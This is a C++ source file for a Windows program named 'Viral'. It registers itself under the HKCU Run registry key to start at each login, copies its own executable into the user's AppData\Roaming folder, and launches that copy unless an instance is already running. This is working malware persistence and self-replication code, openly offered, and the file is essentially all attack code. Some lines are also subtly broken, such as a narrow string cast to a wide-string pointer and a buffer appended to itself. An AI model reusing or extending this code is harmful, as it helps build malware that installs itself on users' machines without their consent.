#include "Viral.hpp"

bool Viral::FindRunningProcess()
{
	std::string compare;
	bool procRunning = false;
	bool first = false;
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap != INVALID_HANDLE_VALUE)
	{
		pe32.dwSize = sizeof(PROCESSENTRY32);
		if (Process32First(hProcessSnap, &pe32))
		{
			if (pe32.szExeFile == nameProg)
				procRunning = true;
			else
			{
				while (Process32Next(hProcessSnap, &pe32))
				{
					compare = pe32.szExeFile;
					if (compare == nameProg)
					{
						if (first == false)
							first = true;
						else
						{
							procRunning = true;
							break;
						}
					}
				}
			}
			CloseHandle(hProcessSnap);
		}
	}
	return procRunning;
}

Viral::Viral()
{
	GetModuleFileNameA(NULL, PathToExe, MAX_PATH);
	GetModuleFileNameW(NULL, PathToExeW, MAX_PATH);
	nameProg = PathToExe;
	while (nameProg.find("\\") != nameProg.npos)
		nameProg = nameProg.substr(nameProg.find("\\") + 1);
	nameProgW = (LPCWSTR)nameProg.c_str();
	if (checkStartup() == false)
		registerStartup();
	if (FindRunningProcess())
		return;
	replicate();
}

Viral::~Viral()
{
}

void Viral::replicate()
{
	std::ifstream myfile;
	std::string tmp;
	char username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;

	GetUserNameA(username, &username_len);
	tmp = "C:\\Users\\";
	tmp.append(username);
	tmp.append("\\AppData\\Roaming\\");
	tmp.append(nameProg);
	std::ofstream outfile(tmp, std::ios::binary);
	if (!outfile)
		return;
	myfile.open(PathToExe, std::ios::binary);
	if (!myfile)
	{
		outfile.close();
		return;
	}
	outfile << myfile.rdbuf();
	myfile.close();
	outfile.close();
	system(tmp.c_str());
}

bool Viral::checkStartup()
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	bool fSuccess = true;
	DWORD dwRegType = REG_SZ;
	wchar_t szPathToExe[MAX_PATH] = {};
	DWORD dwSize = sizeof(szPathToExe);

	lResult = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey);
	fSuccess = (lResult == 0);
	if (fSuccess)
	{
		lResult = RegGetValueW(hKey, NULL, nameProgW, RRF_RT_REG_SZ, &dwRegType, szPathToExe, &dwSize);
		fSuccess = (lResult == 0);
	}
	if (fSuccess)
		fSuccess = (wcslen(szPathToExe) > 0) ? TRUE : FALSE;
	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}
	return fSuccess;
}

void Viral::registerStartup()
{
	HKEY hKey = NULL;
	long rep = 0;
	bool fSuccess = true;
	DWORD dwSize;
	const size_t count = MAX_PATH * 2;
	wchar_t szValue[count] = {};

	GetModuleFileNameW(NULL, PathToExeW, MAX_PATH);
	wcscpy_s(szValue, count, L"\"");
	wcscat_s(szValue, count, PathToExeW);
	wcscat_s(szValue, count, L"\" ");

	if (PROG_ARG != L"")
		wcscat_s(PROG_ARG, count, PROG_ARG);
	rep = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
	fSuccess = (rep == 0);
	if (fSuccess)
	{
		dwSize = (wcslen(szValue) + 1) * 2;
		rep = RegSetValueExW(hKey, nameProgW, 0, REG_SZ, (BYTE*)szValue, dwSize);
	}
	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}
}